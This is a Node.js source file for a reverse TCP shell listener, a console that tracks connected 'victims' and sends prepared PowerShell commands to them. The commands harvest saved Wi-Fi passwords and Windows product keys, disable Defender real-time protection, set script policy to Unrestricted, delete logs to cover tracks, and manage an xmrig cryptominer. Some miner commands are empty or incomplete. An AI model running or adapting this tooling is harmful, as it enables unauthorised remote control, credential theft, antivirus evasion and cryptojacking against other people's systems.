/*
    nodejs
    reverse tcp shell listener
 */
var net = require("net"); // load tcp library
var readline = require("readline"); // load readline library
var colors = require('colors'); // load color library
var rl = readline.createInterface(process.stdin, process.stdout);
var victims = []; // save victims socket
var current_socket = null;
var prefix = "Armored> ".bold.brightYellow;//https://github.com/msys2/msys2-installer
var i;
//
var term = require( 'terminal-kit' ).terminal ;
//




console.log(
"					.--. \n" +
"					|__| .-------.\n" +
"					|=.| |.-----.|\n" +
"					|--| || VTC ||\n" +
"					|  | |'-----'|\n" +
"					|__|~')_____('\n"
);


	console.log("REMOTE REVERSE SHELL TCP, PANGEA Project, Satcom".bold.brightBlue);

	if (!String.prototype.startsWith) {
	  String.prototype.startsWith = function(searchString, position) {
	    position = position || 0;
	    return this.lastIndexOf(searchString, position) === position;
	  };
	}

// continue read input from repl
function continueRepl(){
    rl.setPrompt(prefix, prefix.length);
    rl.prompt();
}

rl.on('line', function(line) {
    line = line.trim();
    if (line === "exit"){
        for(i = 0; i < victims.length; i++){
            victims[i].end(); // quit socket;
        }
        rl.close(); // close repl
    }
    else if (line === "help"){
        console.log("	▀▀▀▀▀▀▀▀▀▀▀ Help ▀▀▀▀▀▀▀▀▀▀▀".bold.blue + "\n" +
                    "	exit                    ---   quit listener \n" +
                    "	list                    ---   list victims \n" +
                    "	connect num             ---   connect to one victim\n" +
                    "                              eg 'connect 0' will connect to the first victim in victim list\n" +
										"	▀▀▀▀▀▀▀▀▀▀▀ On Target ▀▀▀▀▀▀▀▀▀▀▀".bold.red + "\n" +
										"	BitsTransfer    ---   Install BitsTransfer module in target Powershell \n" +
										"	Info         	---   retrieve Commons Informations from the target \n"+
										"	Fullinfo        ---   retrieve Commons Informations from the target \n" +
										"	Delogs          ---   Deleting all logs and ip entries from the target host (work better as Admin privs) \n" +
										"	Wifipass        ---   Get all wifi passwords from target host \n" +
										"	WinKey         	---   Display Windows Product Key from target host \n" +
										"	ScriptPolicy    ---   Set-ExecutionPolicy Unrestricted on target host \n");

        continueRepl();
    }
    else if (line === "list"){
        console.log("▀▀▀▀▀▀▀▀▀▀▀ Victim List ▀▀▀▀▀▀▀▀▀▀▀".black.bold);
        for (i = 0; i < victims.length; i++){
            console.log((i).toString().cyan.bold + " -   " + victims[i].name.blue);
        }
        continueRepl();
    }
    else if (line.startsWith("connect ")){
        if (victims.length == 0){
            console.log("No victims available right now");
        }
        else{
            var n = parseInt(line.slice(8));
            try{
                current_socket = victims[n];
                console.log("Victim ".red + current_socket.name.blue + " remote shell opens".red + "\n");
                prefix = colors.yellow(current_socket.remoteAddress + "> ");
            }
            catch(e){
                console.log("Invalid command " + line);
            }
        }
        continueRepl();
    }
    else{
        if(current_socket){
					// ------------------------------------------------ COMMANDS SECTION ---------------------------------------------------
					if (line.length == "" || line.length == " ") {
						console.log("nothing sent")
						continueRepl();
					}if (line == "Info"){
						// retrieve Commons Informations from the target
						line = "Get-CimInstance Win32_OperatingSystem | Select-Object  CSName, RegisteredUser, Caption, Version, MUILanguages,InstallDate, OSArchitecture, BootDevice,  BuildNumber,ServicePackMajorVersion | FL"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "Fullinfo"){
					// retrieve Full Informations from the target
						line = "Get-CimInstance Win32_OperatingSystem | FL *"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "BitsTransfer"){
						line = "Import-Module BitsTransfer"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "ScriptPolicy"){

						line = "Set-ExecutionPolicy Unrestricted"
						current_socket.write(line); // send command
						rl.pause();
					}
					if (line == "Delogs"){
						line = "Get-ChildItem C:\ -Recurse -Include *.log, *logs* | Remove-Item"
						current_socket.write(line); // send command
						rl.pause();
						line = "netsh interface ip delete destinationcache;netsh interface ip delete arpcache; ipconfig /flushdns"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "Wifipass"){

						line = "(netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)} | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize"
						current_socket.write(line); // send command
						rl.pause();
					}
					if (line == "WinKey"){

						line = "wmic path softwarelicensingservice get OA3xOriginalProductKey"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "miner install"){
						// ---------------Miner Section---------------

						line = "wget ; mv miner/ c:\Users\Default"
						current_socket.write(line); // send command
						rl.pause();

					}
					if (line == "miner start"){

						line = ""
						current_socket.write(line); // send command
						rl.pause();
					}
					if (line == "miner stop"){

						line = ""
						current_socket.write(line); // send command
						rl.pause();

					}if (line == "miner status"){
						// get miner status

						line = "if((get-process 'xmrig' -ea SilentlyContinue) -eq $Null){'Not Running'}else{'Running'}"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "AV scan"){
						 //# -ErrorVariable myError -ErrorAction 'SilentlyContinue'

						line = "function Get-AntivirusName {[cmdletBinding()]param ([string]$ComputerName = '$env:computername' ,$Credential)BEGIN{$wmiQuery = 'SELECT * FROM AntiVirusProduct'}PROCESS{$AntivirusProduct = Get-WmiObject -Namespace 'root\SecurityCenter2' -Query $wmiQuery  @psboundparametersWrite-host $AntivirusProduct.displayName -ForegroundColor Cyan
}END {}}"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "UPserver start"){

						line = "xterm -e python -m SimpleHTTPServer 8000"
						current_socket.write(line); // send command
						rl.pause();
					}if (line == "AV disable"){

						line = "Set-MpPreference -DisableRealtimeMonitoring $true;New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
						current_socket.write(line); // send command
						rl.pause();
					}
					//mystring = mystring.replace('/r','/');













						// ---------------------------------------------------------------------------------------------------------------------
					else {
						current_socket.write(line); // send command
						rl.pause();
	        }
        }else{
            console.log("No victim chosen, please enter " + 'help'.blue.bold + " for more information");
            continueRepl();
        }
    }
}).on('close', function() {
  console.log('Happy Hack.');
  process.exit(0);
});
rl.setPrompt(prefix, prefix.length);
rl.prompt();

// create server
net.createServer(function(socket){
    // get victim ip:port
    var victim_name = socket.remoteAddress + ":" + socket.remotePort;
    socket.name = victim_name;

    // save to victims
    victims.push(socket);

    // identify victim
    console.log("\nVictim ".red + victim_name.blue + " connected.".red);
    console.log("Run command " + colors.blue("'connect " + (victims.length - 1) + "'") + " to connect to this victim\n");

    // handle incoming message
    socket.on("data", function(data){
        data = data.toString("utf8");
				data1 = data.indexOf('PS');
				data2 = data.indexOf('>');
        console.log(data);
        rl.resume();
        continueRepl();
    });

    // victim disconnect
    socket.on("end", function(){
        victims.splice(victims.indexOf(socket), 1);
        console.log("Victim " + socket.name + " disconnected.");
    });

}).listen(6996);
